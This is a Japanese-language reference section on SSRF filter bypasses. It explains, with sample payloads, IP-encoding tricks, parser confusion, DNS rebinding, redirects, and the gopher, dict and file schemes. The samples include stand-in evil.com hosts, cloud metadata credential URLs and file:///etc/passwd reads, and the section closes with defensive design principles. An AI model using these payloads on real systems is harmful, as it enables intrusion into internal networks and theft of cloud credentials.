## 到達技法リファレンスとペイロード集（HackTricks/PayloadsAllTheThings/Zenn）

本節は、SSRF（Server-Side Request Forgery、サーバ側が第三者に代わってリクエストを送出してしまう脆弱性）における「到達技法」——すなわちアプリケーションが用意した検証やフィルタをどのような原理で回避し、本来アクセスできないはずの内部ネットワークやサーバ自身に到達するか——を、実務で最も参照されるリファレンス2種（HackTricks、PayloadsAllTheThings）と、日本語のハンズオン解説記事（Zenn／chot inc.）から整理する。SSRFの本質は「sink（入力値が最終的に危険な処理へ渡される到達点。ここでは`fetch`やHTTPクライアントライブラリの呼び出しがsinkにあたる）に到達するURL文字列を、アプリケーションが意図しない宛先へ書き換えられること」に尽きる。攻撃者が使う個々のトリックは多岐にわたるが、根底にあるのは「URLパーサ・DNSリゾルバ・フィルタ実装・HTTPクライアントという4つのレイヤーの間に生じる解釈の不一致（parser confusion）」という共通原理である。本節ではこの原理を軸に、具体的な回避パターンを体系的に示す。

### 1. sinkとURL検証のギャップ:「どこで」「何を」検証しているか

SSRFの脆弱なコードパターンは共通して以下の形を取る。

```javascript
// 脆弱なパターン(概念図。実在コードではない)
const newsUrl = req.query.newsUrl;
const res = await fetch(newsUrl); // ← ここがsink
```

Zenn（chot inc.）の解説記事が示すデモサイト「ポンポコ・コーポ」は、Astro(SSR)で構築された架空企業サイト上に「関連会社からのニュースフィードを表示する」機能を持たせ、そのフィード取得先URLをリクエストパラメータ`newsUrl`として外部から直接受け取り、検証なしにサーバ側の`fetch`関数へそのまま渡す構成になっている。著者は設計意図を「リクエストパラメータでURLを受け取れたら便利かな」という一見無害な理由付けで説明しており、これはSSRFが生まれる典型的な経緯——利便性のための可変パラメータ化が、そのまま任意到達先の指定を許してしまう——を端的に示す教材になっている。

> 出典: （日本語）Zenn（chot）— 脆弱なサンプルサイトで挙動を追うハンズオン解説 — https://zenn.dev/chot/articles/88ea57e3108978

この構造から導かれる防御的教訓は、「本当にそこまで柔軟なパラメータが必要か」を設計段階で問い直すことと、「宛先ホストを固定値または許可リストに限定し、後段の接続先を外部入力で可変にしない」ことである。フィルタを後付けする対処療法ではなく、そもそもsinkに到達するURLの構成要素（スキーム・ホスト・ポート）を外部入力から独立させる設計が根本対策になる、という点は本節全体を通じて繰り返し確認する。

以降で扱う「到達技法」は、このsinkの手前に置かれたフィルタ（ホスト名の文字列比較、IPアドレスのブロックリスト、スキームのホワイトリストなど）を、パーサ間の解釈差やエンコーディングの多様性を突いてすり抜けるテクニック集である。

### 2. ローカル・内部アドレスへの到達バイパス

#### 2.1 IPアドレスの表記ゆれ（デコーディング差異）

IPv4アドレス`127.0.0.1`は、10進ドット表記以外にも複数の等価な表現を持つ。これはブラウザやOSのネットワークスタックがPOSIX由来の`inet_aton`系関数の柔軟なパース規則を継承しているためであり、文字列としての見た目は`127.0.0.1`と異なっていても、最終的に同じバイト列（127.0.0.1）へ解決される。フィルタが「文字列に`127.0.0.1`や`localhost`が含まれるか」という単純な文字列比較で実装されている場合、次のような表現はすべて素通りする。

```text
# 10進表現(32bit整数化)
http://2130706433/          → 127.0.0.1
http://3232235521/          → 192.168.0.1
http://2852039166/          → 169.254.169.254 (クラウドメタデータIP)

# 8進表現
http://0177.0.0.1/          → 127.0.0.1
http://0o177.0.0.1/         → 127.0.0.1

# 16進表現
http://0x7f000001/          → 127.0.0.1
http://0xc0a80101/          → 192.168.1.1
http://0xa9fea9fe/          → 169.254.169.254

# 省略形(ドットの省略)
http://0/                   → 0.0.0.0 (環境依存で127.0.0.1相当に解決される場合あり)
http://127.1/               → 127.0.0.1
http://127.0.1/             → 127.0.0.1
http://127.127.127.127/     → 127.0.0.0/8全体がループバック
```

10進表現は「IPv4アドレスの4オクテットをビッグエンディアンの32bit符号なし整数として1つの数値にまとめたもの」である。たとえば`127.0.0.1`は`127*256^3 + 0*256^2 + 0*256 + 1 = 2130706433`となる。多くの言語・OSの標準ライブラリ（glibcの`inet_aton`など）はこの数値表現を正規のIPアドレスとして受理する歴史的経緯があり、URLパーサもこれを継承している。8進表現・16進表現も同様に、各オクテットを別の基数で書いただけであり、フィルタが「ドット区切りの10進数4つ」という形式だけを想定して正規表現チェックしていると、これらすべてが検出漏れになる。

> 出典: HackTricks — SSRF — https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
> 出典: PayloadsAllTheThings — SSRF README — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md

**IPv6表記のバイパス**も同様の原理で成立する。

```text
http://[::]:80/                 # 未指定アドレス。環境によりループバック相当に解決
http://[0000::1]:80/            # ループバックアドレスの冗長表記
http://[::ffff:127.0.0.1]/      # IPv4射影アドレス(IPv4-mapped IPv6)。127.0.0.1と等価
http://ip6-localhost/           # /etc/hostsのエイリアス
http://ip6-loopback/
```

Linuxの`/etc/hosts`には標準で`::1 localhost ip6-localhost ip6-loopback`という行があり、`ip6-localhost`や`ip6-loopback`というホスト名自体がループバックへの別名として機能する。フィルタが`127.0.0.1`という文字列や`localhost`という完全一致のみをブロックしていると、この別名は素通りする。`[::ffff:127.0.0.1]`はIPv4アドレスをIPv6アドレス空間内に埋め込む「IPv4射影アドレス」という正式な仕組みであり、デュアルスタック実装のTCP/IPスタックはこれを127.0.0.1として扱う。フィルタがIPv4形式の文字列パターンだけを検査していると、IPv6表記であるという理由だけで判定をすり抜けてしまう。

#### 2.2 URLエンコーディングとパーサの解釈差

```text
http://127.0.0.1/%61dmin          # %61 = 'a' (単純URLエンコード)
http://127.0.0.1/%2561dmin        # %25 = '%' の二重エンコード → デコードで%61admin→admin
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ            # 丸囲み文字(Unicode互換文字)。IDNA正規化でexample.comに変換されうる
```

二重エンコーディングが機能する理由は、フィルタとsink(実際にリクエストを送るHTTPクライアント)が異なるタイミング・異なる回数でURLデコードを行う場合があるためである。たとえばWAFやアプリケーションの検証ロジックが1回だけデコードして「不正な文字列は含まれない」と判定した後、実際のHTTPクライアントライブラリが内部でさらにもう1回デコードすると、検証時には見えなかった文字列（`admin`など）が最終的なリクエストに現れる。丸囲み文字（Unicode互換文字、Enclosed Alphanumerics）のようなケースは、IDN（国際化ドメイン名）処理系がUnicode正規化(NFKC相当の変換)を行う際に、見た目の異なる文字列が正規化後に同一のASCIIドメイン名へ変換される現象を利用したものである。

#### 2.3 パーサ間の宛先解釈不一致(Host confusion)

異なるURLパーサ実装（フィルタ側が使うライブラリと、実際にリクエストを送るHTTPクライアントが使うライブラリ）が、同一のURL文字列から異なるホスト名を導き出すケースがある。これはSSRF対策の失敗として最も本質的で厄介なパターンであり、「文字列としてのブロックリスト／許可リスト照合」というアプローチそのものの限界を示す。

```text
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http:127.0.0.1/
```

これらはURL構文における`user:password@host`という「ユーザー情報+@+ホスト」の形式を悪用したものである。RFC 3986のURL構文では`@`の前がユーザー情報、後がホストと定義されているが、バックスラッシュや複数の`@`が混在した場合の解釈は実装依存であり、たとえばPythonの`urllib2`と`requests`、あるいはブラウザのURLパーサが同じ文字列から異なるホストを取り出すことが確認されている。フィルタが`urllib.parse`で抽出したホスト名を検証し、実際のリクエストは別のHTTPクライアントが行う——という構成であれば、両者が異なる解釈をした瞬間に検証は無意味化する。

フレームワーク固有のホスト注入パターンとして、以下のようなものも報告されている。

```http
# Flask: @記法によるホスト注入
GET @evildomain.com/ HTTP/1.1
Host: target.com
```

```http
# Spring Boot: ;@プレフィックスによるホスト注入
GET ;@evil.com/url HTTP/1.1
Host: target.com
```

```http
# PHP内蔵サーバ: *とドットレスhex IPの組み合わせ
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
```

これらはいずれも、リバースプロキシやフロントエンドがURLの一部（絶対URI形式のリクエストライン）を解釈する際、`Host`ヘッダとは別に「リクエストライン内に埋め込まれたホスト情報」を優先してしまう実装上の癖を突いたものである。

> 出典: HackTricks — SSRF — https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

#### 2.4 PHPの`filter_var()`バイパスとその他の言語固有トリック

```text
http://test???test.com
0://evil.com:80;http://google.com:80/
```

PHPの`filter_var($url, FILTER_VALIDATE_URL)`は「構文として妥当なURLかどうか」しか検証せず、「意図したホストであるか」は保証しない。`???`のような不正な区切り文字の連続がパーサの内部状態を混乱させ、後続のホスト部分の解釈がアプリケーションの想定と食い違う場合がある。`0://`のようなスキーム部分の細工は、一部のパーサが未知のスキームに対して寛容な回復処理(error recovery)を行い、セミコロン以降を別の意味で再解釈してしまう挙動を利用する。

**JARスキームを使ったブラインド接続確認**も報告されている。

```text
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

`jar:`はJavaのZIP/JARアーカイブアクセス用スキームで、内部で指定したURLに対してHTTP/HTTPS/FTP接続を行った上でZIP形式として解釈しようとする。これはレスポンス内容が画面に反映されない「ブラインドSSRF」の状況でも、内部リクエストの発生自体（コネクション確立の試行）をサーバ側のログや応答時間から間接的に確認する手段として使われる。

#### 2.5 汎用ローカル向けドメインサービス

```text
http://localtest.me/
http://localh.st/
http://sub.127.0.0.1.nip.io/
```

`nip.io`のようなワイルドカードDNSサービスは「`<任意の文字列>.<IPアドレス>.nip.io`」という形式のホスト名を、そのIPアドレスへ自動的に名前解決する。これらのドメインは正規の登録ドメインであるため「ドメイン名の形式チェック」自体は通過し、かつ最終的な名前解決結果は任意のIP（127.0.0.1やプライベートIPレンジ）に到達させられる。フィルタがIPアドレスのリテラル表記のみをブロックし、ドメイン名は無条件に許可している場合に特に有効である。

`.localhost`という予約済みTLD（RFC 6761で規定）も、そのサブドメインに関わらず常にループバックアドレスへ解決される仕様であるため、`任意の文字列.localhost`のような形式で「一見それらしいドメインだがループバックへ到達する」ホスト名を作れる。

> 出典: HackTricks — SSRF — https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

### 3. リダイレクトとDNSリバインディングによる時間差バイパス

#### 3.1 HTTPリダイレクトを使った検証すり抜け

多くのSSRF対策実装は「入力されたURLそのもの」だけを検証し、「そのURLへのリクエストが返す3xxリダイレクト先」までは検証しない、という盲点を抱えている。攻撃者は許可される外部ドメイン（自分が管理するサーバなど）を最初の宛先として渡し、そのサーバから内部アドレスへの302/307/308リダイレクトを返すことで、最終的な到達先を検証をバイパスして内部に向けられる。307/308は「元のHTTPメソッドとボディを維持したままリダイレクトする」というセマンティクスを持つため、POSTリクエストを使うAPIに対しても崩れずに転送できる点が重要である。

```text
https://307.r3dir.me/--to/?url=http://localhost
```

このような公開リダイレクトサービスを使えば、攻撃者自身がリダイレクトサーバを構築・ホスティングしなくても、任意のURLへ307リダイレクトさせるURLを即座に生成できる。防御側の対策としては、リクエストライブラリの「自動リダイレクト追従」を無効化するか、追従後の最終宛先に対しても同じIP検証を再適用する（かつTOCTOU＝検査と使用の間の競合を避けるため、検証後の名前解決結果を使い回す）ことが必須になる。

> 出典: HackTricks — SSRF — https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

#### 3.2 DNSリバインディング

DNSリバインディングは、「フィルタがドメイン名を検証した瞬間」と「実際にHTTPクライアントがそのドメインへ接続する瞬間」の間に発生するタイムラグ（TOCTOU: Time-of-check to time-of-use）を突く攻撃である。攻撃者は自分が管理するDNSサーバ上に、極端に短いTTL（Time To Live、DNSキャッシュの有効期間）を持つレコードを用意し、同じドメイン名に対する問い合わせが「許可されるパブリックIP」と「内部IP（例: 169.254.169.254のようなメタデータIPやプライベートIP）」を交互に返すよう設定する。

```text
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

このようなサービス（`1u.ms`）は、ドメイン名のラベル自体にリバインド元・先のIPをエンコードする形式を取り、DNS問い合わせのたびに応答IPをラウンドロビンで切り替える設定を自動生成する。検証時（1回目の名前解決）には許可対象の無害なIPを返し、フィルタがそれを見て「安全」と判定した直後、アプリケーションが実際に接続する（2回目の名前解決、DNSキャッシュのTTL切れ後）タイミングでは内部IPを返す、という時間差を作り出す。これを`nslookup`で連続実行して応答が実際に交互に変わることを確認するのが典型的な検証手順である。

> 出典: HackTricks — SSRF — https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

DNSリバインディングへの根本的な防御は、名前解決とその名前解決結果を使った接続を同一のタイミングで結びつけること（解決したIPをアプリケーション層で固定し、TTLに関わらず再解決しない）と、解決されたIPがプライベート/リンクローカルレンジであれば接続そのものを拒否する、という2点を組み合わせる必要がある。ドメイン名だけを一度検証してIPアドレスの再検証を省略する実装は、原理的にこの攻撃に対して脆弱である。

### 4. URLスキームの悪用によるプロトコルスマグリング

SSRFの影響範囲は、アプリケーションが使うHTTPクライアントライブラリが「どのスキーム(scheme)まで受理するか」に大きく左右される。多くの言語の標準/準標準HTTPクライアント（PHPの`curl`拡張、Javaの`URLConnection`など）はHTTP/HTTPS以外にも歴史的経緯から多数のスキームをサポートしており、これがSSRFの被害を「外部への不正リクエスト」から「内部ファイル読み取り」「任意プロトコルでの生バイト送信」にまで拡大させる。

#### 4.1 `file://` — ローカルファイル読み取り

```text
file:///etc/passwd
```

`file://`スキームはネットワーク通信を介さず、ローカルファイルシステム上のパスをそのまま読み取る。SSRFのsinkとなるHTTPクライアントがこのスキームを許可している場合、攻撃はネットワーク到達の問題を飛び越えて「サーバプロセスの実行ユーザーが読めるファイルすべて」への読み取り専用アクセスに直結する。設定ファイル（データベース接続文字列を含む`.env`など）やSSH鍵、クラウドのローカル認証情報キャッシュがこの経路で窃取される。

#### 4.2 `gopher://` — 任意TCPペイロードの送出

```text
gopher://[host]:[port]/[type][selector]
```

Gopherは1990年代初頭にHTTP以前に使われていた軽量なテキストプロトコルだが、その仕様上の特徴として「サーバへ送るデータをURLのセレクタ部分にほぼ生のバイト列として埋め込める」という性質がある。HTTPクライアントのgopherサポートは、実質的に「任意のTCPペイロードを、URLとしてエンコードして指定ホスト・ポートへそのまま送りつける」汎用インジェクションプリミティブとして機能する。これにより、HTTPを話さない内部サービス（Redis、Memcached、SMTPサーバなど）に対しても、そのプロトコルの生コマンド列をURLの中に埋め込んで送出できる。

```text
gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

`%0D%0A`はCRLF（キャリッジリターン+ラインフィード）のURLエンコードであり、SMTPのようなテキストベースのプロトコルはコマンドの区切りをCRLFで判定する。gopherペイロードの中にCRLFを埋め込むことで、複数行にまたがるプロトコルコマンド列（SMTPの`HELO`→`MAIL FROM`→`RCPT TO`→`DATA`の一連のやり取りなど）を1回のリクエストで注入できる。これは「SSRF経由のプロトコルスマグリング」と呼ばれる技法の典型例であり、Redisのようにアクセス制御が甘い内部サービスに対しては、gopher経由でRedisプロトコルコマンドを送り込み、Webシェルの書き込みや設定変更（`CONFIG SET`によるRDB永続化パスの書き換えなど）まで到達する高度な攻撃チェーンに発展する。

> 出典: HackTricks — SSRF — https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
> 出典: PayloadsAllTheThings — SSRF README — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md

#### 4.3 `dict://` — 辞書サービスプロトコルの流用

```text
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
```

DICT（RFC 2229）は単語定義を検索する古いプロトコルだが、その接続確立の単純さ（TCP接続を開いてテキストコマンドを送るだけ）から、SSRFにおいては「指定ホスト・ポートへTCP接続が確立できるかどうか」を確認するポートスキャンの手段としても好まれる。多くのHTTPクライアント実装（特にlibcurlベースのもの）はDICTスキームをネイティブサポートしており、`dict://internal-host:port/`のような形でリクエストを送ると、接続成功時と失敗時でレスポンスの違い（タイムアウトかDICTプロトコルエラーか）が生じ、内部ポートの開閉状態を推測できる。

#### 4.4 その他のスキーム: `sftp://` `tftp://` `ldap://` `netdoc://`

```text
sftp://evil.com:11111/                              # SSH経由のファイル転送。TCP接続確立の検証に利用
tftp://evil.com:12346/TESTUDPPACKET                 # UDPベース。ファイアウォール越えの経路確認に利用されることがある
ldap://localhost:11211/%0astats%0aquit               # 改行注入によるプロトコルコマンド埋め込み
netdoc:///etc/passwd                                  # Java固有。file://の亜種で改行文字の扱いが異なる
```

`netdoc://`はJavaのネットワーククラスライブラリに存在するスキームで、`file://`とほぼ同じくローカルファイルを読み取るが、改行やキャリッジリターンの扱いが`file://`と微妙に異なるため、`file://`スキームだけをブロックリストに入れているフィルタに対する迂回策として使われることがある。これは「機能的に同じ結果をもたらす別名のスキームが存在する」という、ブロックリスト方式の本質的な弱点（列挙漏れ)を示す典型例である。

> 出典: PayloadsAllTheThings — SSRF README — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md

### 5. ポートスキャンとしてのSSRF

SSRFはデータ窃取だけでなく、外部から直接到達できない内部ネットワークに対する**ポートスキャン**の手段としても使われる。原理は単純で、sinkとなるHTTPクライアントに内部IP・ポートの組み合わせを次々投げ、レスポンスの違い（成功/接続拒否/タイムアウト/プロトコルエラー）を観測する。

```text
ssrf.php?url=http://127.0.0.1:22    # SSHバナー待受確認、あるいは接続後すぐ切断されるエラー
ssrf.php?url=http://127.0.0.1:80    # HTTPサーバ応答の有無
ssrf.php?url=http://127.0.0.1:443   # TLSハンドシェイクエラー(HTTPクライアントが平文でTLSポートに接続した場合)
```

アプリケーションがエラーメッセージをそのまま返す実装であれば、「Connection refused（ポート閉）」「Connection timed out（ファイアウォールでドロップ、またはホスト不在）」「実際のHTTPレスポンス（ポート開、サービス稼働中）」という3パターンの違いから、内部ネットワークのどのホスト・ポートにどんなサービスが立っているかを外形的に地図化(マッピング)できる。この情報自体が機密性の高い偵察情報（内部アーキテクチャの露見）であり、直接のデータ窃取に至らなくても脆弱性として扱われる根拠になる。

### 6. クラウドメタデータエンドポイントへの到達

クラウド環境（特にAWS EC2）では、インスタンス自身に対して`169.254.169.254`というリンクローカルアドレス（IPv4のAPIPA/リンクローカル予約レンジ169.254.0.0/16内)でメタデータサービスが待ち受けており、認証なしでインスタンスの一時的なIAM認証情報（アクセスキー・シークレットキー・セッショントークン）を取得できる仕組みが提供されている。

```text
http://169.254.169.254/latest/meta-data/
```

SSRFが成立しているサーバがこのアドレスにHTTPリクエストを発行できれば、そのサーバが持つクラウドロールの一時認証情報を丸ごと窃取でき、SSRFは「Webサーバ単体の侵害」から「クラウドアカウント全体への横展開」へと一気にエスカレーションする。これがSSRFが単なる情報漏えいに留まらず、クラウドネイティブ環境において特に危険視される最大の理由である。先述の10進数エンコーディング（`http://2852039166/` = `169.254.169.254`）は、まさにこのメタデータIPに対するブロックリストを回避するためによく使われる表現である。

> 出典: HackTricks — SSRF — https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
> 出典: PayloadsAllTheThings — SSRF README — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md

防御側の対策として、AWSはIMDSv2（Instance Metadata Service Version 2, 2019年11月導入）を提供している。IMDSv2は単純なGETリクエストではなく、事前に`PUT`メソッドでトークンを取得し、そのトークンを`X-aws-ec2-metadata-token`ヘッダに付与しなければメタデータを取得できない仕組みになっている。多くのSSRF実装はクライアント側で任意のHTTPメソッドやカスタムヘッダを付与できないため（GETのみでURLしか渡せないケースが大半）、IMDSv2の強制はSSRFによるメタデータ窃取に対する実効性の高い緩和策として機能する。ただし2026年現在でも、IMDSv1を許可したまま運用されているレガシーインスタンスは残存しており、「IMDSv2強制（`HttpTokens: required`設定）」を組織全体でポリシーとして強制しない限り、この対策は穴が残る点に注意が必要である。

### 7. ブラインドSSRFの検出と帯域外(OOB)確認

レスポンス内容がアプリケーション画面に一切反映されない「ブラインドSSRF」では、リクエストが実際に発生したかどうかを外部から観測できるコールバック基盤（帯域外/Out-of-Bandインタラクション検出サービス）を使う。

- Burp Collaborator（Burp Suite組み込み）
- `interactsh`（ProjectDiscoveryが提供するOSSのOOBインタラクション検出基盤）
- `webhook.site` / `pingb.in`（簡易なHTTPリクエストロガー）
- `canarytokens.org`（トークン付きURL/ファイルへのアクセスを検知する汎用カナリア）

これらのサービスが生成する一意なサブドメイン(例: `xxxxxx.oast.fun`のような形式)を攻撃対象のSSRFパラメータに埋め込み、そのサブドメインへのDNSクエリまたはHTTPリクエストがサービス側のログに記録されれば、画面上に何も表示されなくてもSSRFが実際に内部から発火した（少なくとも外部への到達は成立した）ことを確認できる。DNSクエリだけが記録されHTTPリクエストが記録されない場合は、名前解決までは到達したがTCP接続自体はファイアウォール等でブロックされている、という中間状態の切り分けにも使える。

> 出典: HackTricks — SSRF — https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

### 8. 到達技法から見た防御の勘所

本節で扱った技法を俯瞰すると、SSRF対策で陥りがちな失敗は次の3パターンに集約される。

1. **文字列ベースの検証**（`127.0.0.1`や`localhost`という文字列そのものをブロックする）は、10進/8進/16進表記、IPv6表記、`nip.io`のような外部DNSサービス、`.localhost`予約TLDなど、無数の等価表現によって原理的に突破される。IPアドレスは文字列としてではなく、**実際に名前解決した後の数値表現（バイト列）**で判定し、プライベート/リンクローカル/ループバックの各RFC予約レンジ（RFC 1918、RFC 5735など）に該当するかを構造的にチェックする必要がある。
2. **検証と接続のタイミング分離**（フィルタが検証したホスト名と、実際にHTTPクライアントが接続するホスト名が別タイミングで名前解決される）は、DNSリバインディングとリダイレクトチェーンの両方に共通する脆弱性の温床である。検証時に解決したIPアドレスを固定し、そのIPに対して直接接続する（アプリケーション層でDNS解決結果を使い回す）実装が必須になる。
3. **スキームのホワイトリスト漏れ**（HTTP/HTTPSのみを許可する意図が、実装ではブロックリスト方式になっている）は、`gopher://` `dict://` `file://`のような非HTTP系スキームを通してしまう。許可すべきスキームを明示的にホワイトリスト方式で列挙し、それ以外はすべて拒否する実装のみが安全である。

これら3点はいずれも、個別の回避テクニックを1つずつ潰す「モグラ叩き」ではなく、検証ロジックの設計原則（数値レベルでの判定・検証と使用のタイミング一致・ホワイトリスト方式）を変えることで、本節で列挙した多数のバイパス手法をまとめて無効化できるという点で共通している。次章以降では、これらの原理を踏まえた具体的な防御実装パターン（許可リストの実装例、ネットワークレベルでの隔離、クラウドメタデータの保護設定など）を扱う。
